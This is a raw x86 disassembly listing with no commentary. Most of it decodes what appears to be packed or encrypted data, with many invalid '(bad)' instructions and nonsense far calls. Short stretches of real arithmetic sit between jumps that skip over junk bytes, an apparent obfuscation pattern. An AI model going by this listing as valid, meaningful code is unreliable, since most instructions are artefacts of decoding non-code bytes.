  4065f0:	fidivr DWORD PTR [edx+0x452e218d]
  4065f6:	mov    eax,0x713dea06
  4065fb:	lods   eax,DWORD PTR ds:[esi]
  4065fc:	inc    eax
  4065fd:	fisttp WORD PTR [edi]
  4065ff:	cld    
  406600:	data16 and al,0xa8
  406603:	adc    esp,DWORD PTR [eax-0x4bf7f5e0]
  406609:	and    al,dh
  40660b:	mov    ch,0x67
  40660d:	fnsave [ebp+0x344a0b3]
  406613:	mov    dh,0x60
  406615:	and    BYTE PTR [eax],0x5
  406618:	push   esp
  406619:	lea    esi,[eax+0x7]
  40661c:	test   eax,0x4d575b1c
  406621:	daa    
  406622:	ror    DWORD PTR [ebp+0x2d],0xfb
  406626:	jae    0x4065c3
  406628:	push   esp
  406629:	mov    bh,0x0
  40662b:	sahf   
  40662c:	add    eax,DWORD PTR [ebp-0x255ae837]
  406632:	loop   0x40663d
  406634:	mov    bh,0x24
  406636:	sub    dh,BYTE PTR [ebp+edi*2+0xd]
  40663a:	sti    
  40663b:	loopne 0x406636
  40663d:	loope  0x406669
  40663f:	sub    ah,BYTE PTR [ecx]
  406641:	xor    edi,DWORD PTR [ecx+edx*8]
  406644:	sbb    al,0x87
  406646:	sbb    al,0x15
  406648:	xchg   DWORD PTR [edi-0x37],edi
  40664b:	(bad)  
  40664c:	mov    edi,0xc0bca1c0
  406651:	sub    BYTE PTR [edx+0x49547f13],bl
  406657:	jmp    0xb94b473d
  40665c:	ss icebp 
  40665e:	popa   
  40665f:	into   
  406660:	adc    ah,BYTE PTR [edi+0x339e8355]
  406666:	ret    0xd567
  406669:	test   al,0xf6
  40666b:	inc    eax
  40666c:	sub    edi,DWORD PTR [esi-0x59]
  40666f:	loopne 0x40667a
  406671:	iret   
  406672:	cmp    esp,eax
  406674:	jecxz  0x406659
  406676:	stos   BYTE PTR es:[edi],al
  406677:	sti    
  406678:	pop    ebp
  406679:	push   es
  40667a:	fmul   DWORD PTR ds:[eax]
  40667d:	inc    dl
  40667f:	lds    ebp,FWORD PTR [ebx+0x32]
  406682:	std    
  406683:	pop    eax
  406684:	nop
  406685:	mov    WORD PTR [eax+0x4f7ee432],fs
  40668b:	inc    ecx
  40668c:	dec    ebp
  40668d:	jnp    0x406702
  40668f:	dec    esi
  406690:	jecxz  0x406638
  406692:	ret    
  406693:	rcr    esi,0xb6
  406696:	lock das 
  406698:	push   ds
  406699:	add    bl,bl
  40669b:	int3   
  40669c:	and    DWORD PTR [esi],ebx
  40669e:	mov    eax,ds:0xd4df32a4
  4066a3:	adc    eax,DWORD PTR [eax+0x779a6d85]
  4066a9:	inc    eax
  4066aa:	jae    0x406666
  4066ac:	or     eax,0x33d114c0
  4066b1:	push   es
  4066b2:	int    0xd5
  4066b4:	ins    BYTE PTR es:[edi],dx
  4066b5:	jo     0x406711
  4066b7:	repz cs jle 0x4066ff
  4066bb:	pop    ds
  4066bc:	imul   eax,DWORD PTR [edx],0xc93208dc
  4066c2:	push   ebx
  4066c3:	ins    BYTE PTR es:[edi],dx
  4066c4:	loop   0x40664a
  4066c6:	retf   
  4066c7:	cmp    al,0xc5
  4066c9:	cdq    
  4066ca:	adc    edx,DWORD PTR [ebx]
  4066cc:	xchg   esi,eax
  4066cd:	ret    
  4066ce:	inc    esp
  4066cf:	sbb    eax,0xb9635465
  4066d4:	or     eax,0x7333e0bc
  4066d9:	jge    0x40674e
  4066db:	dec    ecx
  4066dc:	mov    ebp,DWORD PTR [esi]
  4066de:	inc    ebp
  4066df:	sub    al,0xad
  4066e1:	xor    ecx,ecx
  4066e3:	push   0xffffff93
  4066e5:	xor    al,0x10
  4066e7:	imul   esi,edx,0x7d
  4066ea:	pop    eax
  4066eb:	xchg   edi,eax
  4066ec:	mov    edi,0x6b36bdb1
  4066f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066f2:	dec    eax
  4066f3:	fwait
  4066f4:	xlat   BYTE PTR ds:[ebx]
  4066f5:	fcom   st(0)
  4066f7:	mov    eax,ds:0xbb42447
  4066fc:	push   ebx
  4066fd:	or     bh,ah
  4066ff:	out    dx,al
  406700:	test   eax,0x4966ce4c
  406705:	mov    cl,0x82
  406707:	ins    DWORD PTR es:[edi],dx
  406708:	jo     0x406740
  40670a:	(bad)  
  40670b:	cs and eax,0xb8e0920f
  406711:	xchg   BYTE PTR [ebx],dl
  406713:	fcomp  st(4)
  406715:	pop    ss
  406716:	repnz aas 
  406718:	mov    ah,0x57
  40671a:	(bad)  
  40671b:	lock ja 0x406739
  40671e:	or     ebp,DWORD PTR [edi-0x4c]
  406721:	sbb    BYTE PTR [ebp+eiz*2-0x3e2b2271],ch
  406728:	inc    edi
  406729:	pop    esp
  40672a:	xor    bh,ch
  40672c:	sar    BYTE PTR [eax-0x1cf0d824],cl
  406732:	scas   al,BYTE PTR es:[edi]
  406733:	xor    eax,0x879034f8
  406738:	xchg   edx,eax
  406739:	aas    
  40673a:	pop    edi
  40673b:	test   BYTE PTR [eax+0x1e],bh
  40673e:	adc    al,0x9e
  406740:	push   ds
  406741:	pushf  
  406742:	rcr    edx,0xd5
  406745:	and    DWORD PTR [edi+0x23],ebp
  406748:	dec    eax
  406749:	imul   esi,DWORD PTR [eax],0x40
  40674c:	sahf   
  40674d:	pop    esp
  40674e:	loop   0x4067ac
  406750:	(bad)  
  406751:	and    eax,0xdbe35a75
  406756:	dec    eax
  406757:	xor    edi,DWORD PTR [eax+ecx*4+0x39]
  40675b:	sub    ch,bl
  40675d:	sar    BYTE PTR [edx+edx*2-0x4705bee8],1
  406764:	mov    bh,BYTE PTR [ecx-0x6b]
  406767:	jb     0x4067bb
  406769:	fwait
  40676a:	push   ebx
  40676b:	mov    ebp,0x45cb1340
  406770:	adc    BYTE PTR [edi],bh
  406772:	enter  0xf7fe,0x34
  406776:	cdq    
  406777:	mov    ebp,DWORD PTR [ebx]
  406779:	xor    al,0x9b
  40677b:	and    eax,0x9b39cd9f
  406780:	gs mov esi,0xef9b0f03
  406786:	lock jge 0x40673c
  406789:	fwait
  40678a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40678b:	cmp    eax,0xb9465864
  406790:	inc    ecx
  406791:	outs   dx,DWORD PTR ds:[esi]
  406792:	cmp    DWORD PTR [ebx-0x63],0xffffff98
  406796:	and    DWORD PTR [edi-0x3],ebp
  406799:	pushf  
  40679a:	call   0xe031:0xd140a77f
  4067a1:	fiadd  WORD PTR [ecx-0x32]
  4067a4:	int    0xfe
  4067a6:	shr    ecx,cl
  4067a8:	pop    ebx
  4067a9:	dec    eax
  4067aa:	pop    ecx
  4067ab:	xor    edx,DWORD PTR [esi+0x2e]
  4067ae:	popf   
  4067af:	fldcw  WORD PTR [edi-0x50231272]
  4067b5:	adc    al,0x6c
  4067b7:	jg     0x4067f1
  4067b9:	bound  edx,QWORD PTR [edi]
  4067bb:	sub    al,0x8e
  4067bd:	inc    edx
  4067be:	adc    edx,DWORD PTR [eax+0x7b4bd892]
  4067c4:	jecxz  0x4067e1
  4067c6:	(bad)  
  4067c7:	push   edi
  4067c8:	pop    ecx
  4067c9:	pop    ebx
  4067ca:	add    eax,DWORD PTR [ebx+0x28]
  4067cd:	jnp    0x406834
  4067cf:	mov    ds:0x53cfef86,eax
  4067d4:	in     eax,dx
  4067d5:	addr16 push edi
  4067d7:	dec    ecx
  4067d8:	fcom   DWORD PTR [eax]
  4067da:	add    al,0x1a
  4067dc:	call   0x8e89e7bb
  4067e1:	lods   eax,DWORD PTR ds:[esi]
  4067e2:	sub    DWORD PTR [eax+esi*1],ebx
  4067e5:	xlat   BYTE PTR ds:[ebx]
  4067e6:	std    
  4067e7:	call   0x8de776b0
  4067ec:	adc    BYTE PTR [esi-0x46a1944f],0xf7
  4067f3:	dec    edx
  4067f4:	jae    0x406847
  4067f6:	(bad)  
  4067f7:	not    BYTE PTR [eax]
  4067f9:	pop    esp
  4067fa:	jg     0x4067cf
  4067fc:	hlt    
  4067fd:	sub    al,0x22
  4067ff:	pop    es
  406800:	xor    DWORD PTR [esi-0x182caabe],ebx
  406806:	sahf   
  406807:	mov    edx,0xad2bf2d3
  40680c:	shl    BYTE PTR [ecx],0x58
  40680f:	(bad)  
  406810:	outs   dx,DWORD PTR ds:[esi]
  406811:	inc    ecx
  406812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406813:	adc    ebp,esi
  406815:	rol    BYTE PTR [edi+0x31],cl
  406818:	jno    0x4067cb
  40681a:	sbb    al,0x3
  40681c:	xchg   esp,eax
  40681d:	jno    0x4067e8
  40681f:	std    
  406820:	lods   eax,DWORD PTR ds:[esi]
  406821:	mov    DWORD PTR [esi-0x4d],eax
  406824:	add    eax,0xbb5844d7
  406829:	lods   eax,DWORD PTR ds:[esi]
  40682a:	outs   dx,DWORD PTR ds:[esi]
  40682b:	inc    edx
  40682c:	and    eax,0xff159467
  406831:	pop    ecx
  406832:	popf   
  406833:	dec    edx
  406834:	shl    BYTE PTR [esi],1
  406836:	xchg   edx,eax
  406837:	mov    DWORD PTR [ebx],edi
  406839:	dec    edx
  40683a:	(bad)  [edi-0x8]
  40683d:	mov    eax,ds:0xafd5cf52
  406842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406843:	push   esi
  406844:	dec    esi
  406845:	idiv   BYTE PTR [ecx]
  406847:	xchg   esp,eax
  406848:	cwde   
  406849:	data16 xor BYTE PTR [eax+0x7e],ch
  40684d:	enter  0x596f,0xd7
  406851:	and    eax,0x6d55584e
  406856:	mov    bl,ah
  406858:	pop    edi
  406859:	in     al,0x83
  40685b:	mov    esi,0xa42926e
  406860:	pop    ds
  406861:	cmc    
  406862:	dec    eax
  406863:	mov    edi,0x9f69c24c
  406868:	stos   DWORD PTR es:[edi],eax
  406869:	fisub  WORD PTR [edi+0xa]
  40686c:	sub    DWORD PTR [esi+0x60d6466],ebp
  406872:	js     0x40682c
  406874:	mov    ecx,0xf2acd0aa
  406879:	mov    bh,0xd0
  40687b:	iret   
  40687c:	cmc    
  40687d:	sbb    eax,0xdf29f340
  406882:	xor    cl,BYTE PTR [esi+0x72937b7f]
  406888:	xchg   edx,eax
  406889:	and    ebx,DWORD PTR [ebx+0x292c6fb8]
  40688f:	mov    bh,0x3b
  406891:	cmp    BYTE PTR [ebx],dl
  406893:	icebp  
  406894:	push   edi
  406895:	push   es
  406896:	mov    eax,ds:0x9a42f1d
  40689b:	add    ebx,DWORD PTR [esi]
  40689d:	loop   0x406853
  40689f:	call   0x1cccaaaa
  4068a4:	adc    edi,ebp
  4068a6:	and    dl,bh
  4068a8:	push   0x5f3b80ea
  4068ad:	jno    0x4068c0
  4068af:	add    ebx,DWORD PTR [ebx]
  4068b1:	stos   BYTE PTR es:[edi],al
  4068b2:	sub    DWORD PTR [edx+0x6cc0b0e0],ebp
  4068b8:	inc    ecx
  4068b9:	xchg   edi,eax
  4068ba:	in     al,dx
  4068bb:	and    bl,BYTE PTR [esi-0x56e033e8]
  4068c1:	cwde   
  4068c2:	loop   0x40689b
  4068c4:	adc    ah,BYTE PTR [esi]
  4068c6:	jne    0x40684c
  4068c8:	adc    DWORD PTR [ebp+0x7f8b8b92],ecx
  4068ce:	xchg   DWORD PTR [esi],eax
  4068d0:	push   es
  4068d1:	push   ds
  4068d2:	dec    ebx
  4068d3:	(bad)  
  4068d4:	mov    eax,ebx
  4068d6:	adc    DWORD PTR [ebp+0x3d1f77c1],eax
  4068dc:	imul   esi,ebx,0x28
  4068df:	jns    0x40693e
  4068e1:	(bad)  [ecx-0x5c4518a6]
  4068e7:	xor    BYTE PTR ds:0x80b0c75f,dl
  4068ed:	out    dx,eax
  4068ee:	jae    0x4068bf
  4068f0:	out    dx,eax
  4068f1:	ror    DWORD PTR [ebp-0x477ed594],1
  4068f7:	retf   
  4068f8:	je     0x4068ce
  4068fa:	mov    eax,ds:0x874bd6df
  4068ff:	jmp    0x32d97b06
  406904:	jb     0x4068ff
  406906:	pop    eax
  406907:	dec    edi
  406908:	lods   al,BYTE PTR ds:[esi]
  406909:	retf   
  40690a:	jp     0x406966
  40690c:	cli    
  40690d:	test   al,0xf7
  40690f:	jge    0x406943
  406911:	xchg   esi,eax
  406912:	jae    0x4068d6
  406914:	jnp    0x40690e
  406916:	pop    eax
  406917:	shl    ecx,0x1e
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0x7e4fc32a
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	aaa    
  406981:	mov    bh,0xf5
  406983:	not    DWORD PTR [ebp+0x7d04efe4]
  406989:	shl    DWORD PTR [esp+ebx*1],cl
  40698c:	xor    al,0xe5
  40698e:	inc    ecx
  40698f:	mov    fs,WORD PTR [edx+0x4f0fb86e]
  406995:	inc    esi
  406996:	hlt    
  406997:	sub    DWORD PTR [edi],0x5f
  40699a:	mov    ebx,0xeb98cb8f
  40699f:	mov    al,ds:0x4a01a312
  4069a4:	fiadd  DWORD PTR [ebx+edi*8]
  4069a7:	inc    esp
  4069a8:	leave  
  4069a9:	aad    0x59
  4069ab:	lods   al,BYTE PTR ds:[esi]
  4069ac:	dec    ebx
  4069ad:	aas    
  4069ae:	sub    bl,BYTE PTR [ebp+0x3]
  4069b1:	cld    
  4069b2:	xchg   edx,eax
  4069b3:	inc    ecx
  4069b4:	mov    cs,edx
  4069b6:	dec    esi
  4069b7:	pusha  
  4069b8:	add    edx,ecx
  4069ba:	xchg   edi,eax
  4069bb:	or     eax,0xb80c5415
  4069c0:	push   es
  4069c1:	mov    ecx,0x8d7c31bb
  4069c6:	mov    al,ds:0x6071e9ba
  4069cb:	das    
  4069cc:	xor    bh,cl
  4069ce:	and    eax,edx
  4069d0:	lods   al,BYTE PTR ds:[esi]
  4069d1:	arpl   WORD PTR [ecx+0x292c1fce],bp
  4069d7:	mov    esi,0x3be42ed6
  4069dc:	jmp    0x4069a6
  4069de:	in     eax,0xa2
  4069e0:	imul   edi,DWORD PTR [edx],0x56cd30a6
  4069e6:	mov    ebp,0x4b31831c
  4069eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069ec:	rol    BYTE PTR [esi+0x6ec29835],1
  4069f2:	addr16 mov edi,0x57bf3458
  4069f8:	imul   ebp,ebp,0x441aac93
  4069fe:	shl    BYTE PTR [ebx+0x54],1
  406a01:	cmp    WORD PTR [edi+0x72],bx
  406a05:	cmp    eax,0x89e4f014
  406a0a:	shl    BYTE PTR [ebx+0x14],1
  406a0d:	daa    
  406a0e:	jno    0x4069a2
  406a10:	hlt    
  406a11:	js     0x406a86
  406a13:	fwait
  406a14:	shr    BYTE PTR [ebp-0x26f956c0],1
  406a1a:	bound  eax,QWORD PTR [ebx]
  406a1c:	rdtsc  
  406a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a1f:	rep lods al,BYTE PTR ds:[esi]
  406a21:	jns    0x4069ef
  406a23:	retf   
  406a24:	inc    ecx
  406a25:	xchg   ecx,eax
  406a26:	ror    DWORD PTR ds:0x9fce4f6b,1
  406a2c:	mov    bh,0x38
  406a2e:	cwde   
  406a2f:	push   ebx
  406a30:	mov    ch,0x71
  406a32:	pop    ebp
  406a33:	sbb    DWORD PTR [ecx+0x193f9037],eax
  406a39:	fistp  QWORD PTR [ecx]
  406a3b:	cmp    al,0x33
  406a3d:	std    
  406a3e:	(bad)  [ebx]
  406a40:	arpl   WORD PTR [eax-0x71aca7bc],bx
  406a46:	mov    ah,0xce
  406a48:	xchg   edx,eax
  406a49:	es xchg ebp,eax
  406a4b:	gs pusha 
  406a4d:	jle    0x406a39
  406a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a50:	sbb    al,0xb2
  406a52:	adc    ax,0x84ff
  406a56:	in     eax,0xc2
  406a58:	jno    0x4069ff
  406a5a:	and    bl,BYTE PTR [ecx-0x8]
  406a5d:	or     BYTE PTR [ebx],0x17
  406a60:	lods   eax,DWORD PTR ds:[esi]
  406a61:	lods   al,BYTE PTR ds:[esi]
  406a62:	fsubr  st,st(1)
  406a64:	stc    
  406a65:	call   0x47b7:0x520720a8
  406a6c:	dec    esp
  406a6d:	xor    BYTE PTR [ecx+0xc],cl
  406a70:	and    al,BYTE PTR [esp+eiz*8-0x14]
  406a74:	arpl   sp,ax
  406a76:	cmc    
  406a77:	and    eax,0x85c835a2
  406a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a7d:	les    esp,FWORD PTR [esi]
  406a7f:	and    dh,BYTE PTR [ecx]
  406a81:	adc    bl,BYTE PTR [edx-0x15]
  406a84:	je     0x406a40
  406a86:	mov    al,ds:0x7de76aaa
  406a8b:	cmp    ebp,eax
  406a8d:	hlt    
  406a8e:	jns    0x406af2
  406a90:	ja     0x406a1d
  406a92:	dec    ebx
  406a93:	mov    ebx,0x6436ef7e
  406a98:	xor    DWORD PTR [edi-0x6d],esi
  406a9b:	xor    eax,0x60caa4d3
  406aa0:	mov    esi,edx
  406aa2:	int    0x59
  406aa4:	shl    BYTE PTR [esi-0x2b],cl
  406aa7:	loopne 0x406a64
  406aa9:	adc    ebp,DWORD PTR [ebp+0x8]
  406aac:	(bad)  
  406aad:	xor    BYTE PTR [edx+eax*2-0x7ae83fa],cl
  406ab4:	aas    
  406ab5:	adc    dh,BYTE PTR [eax-0x9]
  406ab8:	nop
  406ab9:	ins    DWORD PTR es:[edi],dx
  406aba:	add    esp,0x91a63fbc
  406ac0:	shr    BYTE PTR [ecx-0x213c8b11],cl
  406ac6:	inc    esp
  406ac7:	shr    DWORD PTR [ebx+0x6a],0xa2
  406acb:	xchg   ebp,eax
  406acc:	jle    0x406ab9
  406ace:	mov    BYTE PTR [ecx],al
  406ad0:	stc    
  406ad1:	ins    DWORD PTR es:[edi],dx
  406ad2:	cmp    eax,0xaf74281f
  406ad7:	pop    ds
  406ad8:	sbb    edx,eax
  406ada:	scas   eax,DWORD PTR es:[edi]
  406adb:	(bad)  fs:[esi*4+0x3e2c6a48]
  406ae3:	mov    dl,0xf0
  406ae5:	mov    dh,0xc1
  406ae7:	and    ebp,DWORD PTR [esi]
  406ae9:	repnz inc eax
  406aeb:	xchg   ebx,eax
  406aec:	loope  0x406aec
  406aee:	lods   al,BYTE PTR ds:[esi]
  406aef:	sbb    eax,0x53a6451c
  406af4:	or     al,0xc
  406af6:	outs   dx,DWORD PTR ds:[esi]
  406af7:	shr    BYTE PTR [ecx],0x16
  406afa:	xchg   ebx,eax
  406afb:	retf   
  406afc:	test   BYTE PTR [edx+0x754f624a],dh
  406b02:	mov    esi,0x7259a353
  406b07:	mov    ch,BYTE PTR [edi+0x77]
  406b0a:	gs scas eax,DWORD PTR es:[edi]
  406b0c:	adc    al,0xa9
  406b0e:	sub    bl,ch
  406b10:	mov    eax,0x3ad25adc
  406b15:	push   ebx
  406b16:	pop    ecx
  406b17:	in     eax,dx
  406b18:	dec    esi
  406b19:	cmp    DWORD PTR [edi],ecx
  406b1b:	inc    esi
  406b1c:	mov    ebp,0xf7cb1f93
  406b21:	daa    
  406b22:	sbb    DWORD PTR [edi+edx*4-0x5d3d3e12],ecx
  406b29:	ret    
  406b2a:	sbb    bh,BYTE PTR [edi-0x50021af7]
  406b30:	mov    esp,DWORD PTR [bp+di]
  406b33:	je     0x406bae
  406b35:	cmp    edx,eax
  406b37:	(bad)  
  406b38:	in     eax,0x22
  406b3a:	jne    0x406b84
  406b3c:	add    ecx,DWORD PTR [ecx+0x44]
  406b3f:	mov    eax,ds:0x8518a95b
  406b44:	dec    eax
  406b45:	je     0x406b12
  406b47:	sub    BYTE PTR ds:0x2fa35be2,ch
  406b4d:	pop    ss
  406b4e:	loop   0x406b3d
  406b50:	loop   0x406b1a
  406b52:	pop    ds
  406b53:	xchg   ecx,eax
  406b54:	adc    al,0x3f
  406b56:	and    bh,ah
  406b58:	test   BYTE PTR [esi],dl
  406b5a:	jns    0x406af8
  406b5c:	mov    fs,ebp
  406b5e:	not    DWORD PTR fs:[ebx+0x7eebc34e]
  406b65:	dec    esi
  406b66:	(bad)  
  406b67:	mov    ds:0x2f303451,al
  406b6c:	nop
  406b6d:	mov    esp,ebx
  406b6f:	jle    0x406b55
  406b71:	xchg   BYTE PTR [esi-0x7aa5fd01],bh
  406b77:	push   esp
  406b78:	jge    0x406b8e
  406b7a:	lods   al,BYTE PTR ds:[esi]
  406b7b:	mov    ebp,ebx
  406b7d:	sub    DWORD PTR [edi-0x43],eax
  406b80:	and    dl,BYTE PTR [esi+edx*4-0x4e]
  406b84:	adc    eax,0xe46319f1
  406b89:	add    edi,DWORD PTR [ebp+ecx*2+0x32e09e24]
  406b90:	cwde   
  406b91:	mov    dl,0x67
  406b93:	sbb    BYTE PTR [edi+eax*1-0x77a98c01],ah
  406b9a:	jne    0x406b59
  406b9c:	pop    edi
  406b9d:	or     bl,0x16
  406ba0:	xchg   ebp,eax
  406ba1:	mov    eax,0x2343cadb
  406ba6:	fmul   st,st(3)
  406ba8:	or     BYTE PTR [edx],0x44
  406bab:	or     dl,BYTE PTR [edx-0x40]
  406bae:	dec    eax
  406baf:	outs   dx,BYTE PTR ds:[esi]
  406bb0:	loopne 0x406c20
  406bb2:	retf   0xca7c
  406bb5:	push   cx
  406bb7:	pop    ecx
  406bb8:	lock fnsave [edx+0x7c]
  406bbc:	clc    
  406bbd:	rcr    edx,0xd
  406bc0:	aas    
  406bc1:	rcl    ch,0xc
  406bc4:	mov    ah,0xb1
  406bc6:	repz imul edx,DWORD PTR [ebx+0x3ffc7278],0xb68ace89
  406bd1:	pop    ebx
  406bd2:	ins    BYTE PTR es:[edi],dx
  406bd3:	mov    eax,cr3
  406bd6:	mov    eax,0x77482e7f
  406bdb:	mov    ds:0x9a1334c0,eax
  406be0:	mov    ds:0x26bdb480,al
  406be5:	daa    
  406be6:	scas   al,BYTE PTR es:[edi]
  406be7:	cmp    eax,0xd4cba4d1
  406bec:	add    dl,al
  406bee:	and    esi,DWORD PTR [edx+0x36]
  406bf1:	xchg   ebp,eax
  406bf2:	loop   0x406be8
  406bf4:	sti    
  406bf5:	imul   ebp,DWORD PTR [ebx],0xe6f8ff43
  406bfb:	inc    esp
  406bfc:	push   edi
  406bfd:	mov    ebp,0x1844004b
  406c02:	fcmovb st,st(1)
  406c04:	xchg   ecx,eax
  406c05:	or     ch,BYTE PTR [esi-0x63]
  406c08:	or     DWORD PTR [edi+0x62],edi
  406c0b:	ja     0x406ba0
  406c0d:	sti    
  406c0e:	jl     0x406c72
  406c10:	push   edi
  406c11:	adc    eax,0xf52cc54b
  406c16:	mov    ebp,DWORD PTR [ebp-0x319d6e28]
  406c1c:	leave  
  406c1d:	add    ecx,edi
  406c1f:	mov    al,0x41
  406c21:	mov    bh,0xbb
  406c23:	pop    ecx
  406c24:	pop    edx
  406c25:	cmc    
  406c26:	jbe    0x406bbd
  406c28:	mov    bh,0x27
  406c2a:	sbb    dl,BYTE PTR [esi-0x67ec1465]
  406c30:	mov    ah,0xb9
  406c32:	fidiv  DWORD PTR [ecx]
  406c34:	sub    ecx,DWORD PTR [esi+ecx*1-0x63791856]
  406c3b:	inc    esi
  406c3c:	jmp    0x40e3:0xce19c5c1
  406c43:	sub    al,0x54
  406c45:	ret    0x4cf3
  406c48:	push   ecx
  406c49:	push   ss
  406c4a:	mov    al,ds:0xb5e67024
  406c4f:	jl     0x406cb5
  406c51:	fs stos BYTE PTR es:[edi],al
  406c53:	mov    WORD PTR [ecx-0xbaba81b],cs
  406c59:	and    al,0xd9
  406c5b:	pop    ecx
  406c5c:	lock outs dx,BYTE PTR ds:[esi]
  406c5e:	adc    cl,0x94
  406c61:	mov    dh,BYTE PTR [edx+edx*8-0x39]
  406c65:	mov    esi,0x5d06767f
  406c6a:	loope  0x406cbd
  406c6c:	adc    DWORD PTR [eax],edi
  406c6e:	and    al,0xf3
  406c70:	push   es
  406c71:	js     0x406c4d
  406c73:	loop   0x406c20
  406c75:	je     0x406c46
  406c77:	add    al,0x73
  406c79:	icebp  
  406c7a:	inc    edi
  406c7b:	pop    es
  406c7c:	call   0x2546:0x1f699685
  406c83:	bnd es jmp 0x406c73
  406c87:	push   ebp
  406c88:	or     bl,BYTE PTR [ebx+edi*1]
  406c8b:	pop    edi
  406c8c:	sar    BYTE PTR [ebp-0xaa02b6b],1
  406c92:	dec    eax
  406c93:	cmp    eax,0x35ff859c
  406c98:	outs   dx,BYTE PTR ss:[esi]
  406c9a:	jp     0x406cfb
  406c9c:	popa   
  406c9d:	mov    bh,BYTE PTR [esi+ebp*2]
  406ca0:	jno    0x406d1b
  406ca2:	cdq    
  406ca3:	arpl   WORD PTR [ecx+0x54],dx
  406ca6:	dec    ebp
  406ca7:	sub    bh,0xf4
  406caa:	les    esp,FWORD PTR [ebx]
  406cac:	(bad)  
  406cad:	(bad)  
  406cae:	mov    ecx,0x6ec2d770
  406cb3:	test   eax,0x91aa68e0
  406cb8:	add    eax,0x71f21b1e
  406cbd:	jmp    0x406c43
  406cbf:	into   
  406cc0:	sbb    cl,dl
  406cc2:	das    
  406cc3:	sbb    al,0xba
  406cc5:	js     0x406d34
  406cc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cc8:	push   eax
  406cc9:	aam    0x9e
  406ccb:	loopne 0x406d18
  406ccd:	into   
  406cce:	sbb    esi,0xffffffdc
  406cd1:	(bad)  
  406cd2:	aad    0x4c
  406cd4:	loope  0x406c64
  406cd6:	push   0xa0897e3a
  406cdb:	dec    edx
  406cdc:	imul   eax,DWORD PTR [ebx],0x76
  406cdf:	xchg   esp,eax
  406ce0:	adc    cl,dh
  406ce2:	and    dl,BYTE PTR [esi]
  406ce4:	xor    cl,BYTE PTR [ecx-0x19]
  406ce7:	gs pop ecx
  406ce9:	es inc esi
  406ceb:	sbb    BYTE PTR [eax+edx*1+0x45],ah
  406cef:	int3   
  406cf0:	bts    DWORD PTR [edi+0x7e4c14f3],ebp
  406cf7:	sbb    edi,DWORD PTR [edi-0x66cd7322]
  406cfd:	idiv   DWORD PTR [esi-0x45a6ffda]
  406d03:	push   ds
  406d04:	retf   
  406d05:	inc    edi
  406d06:	ret    0x8b28
  406d09:	popa   
  406d0a:	in     al,dx
  406d0b:	jbe    0x406d31
  406d0d:	hlt    
  406d0e:	xchg   ecx,eax
  406d0f:	push   ss
  406d10:	or     esp,0x1b
  406d13:	push   esp
  406d14:	fiadd  WORD PTR [eax]
  406d16:	int    0xdd
  406d18:	rcr    BYTE PTR [edi],0x46
  406d1b:	mov    cl,0xa2
  406d1d:	(bad)  
  406d1e:	in     al,dx
  406d1f:	fcmovbe st,st(2)
  406d21:	adc    DWORD PTR [ebp-0x7d42da1b],ecx
  406d27:	xor    BYTE PTR [eax-0x6f92e895],ah
  406d2d:	dec    edx
  406d2e:	pop    ebp
  406d2f:	jmp    0x406d33
  406d31:	sbb    BYTE PTR [ebx-0x5cd5a9cd],dh
  406d37:	rcr    DWORD PTR [edi],0x95
  406d3a:	call   0x6611:0xf9743c26
  406d41:	shl    ecx,0x1e
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
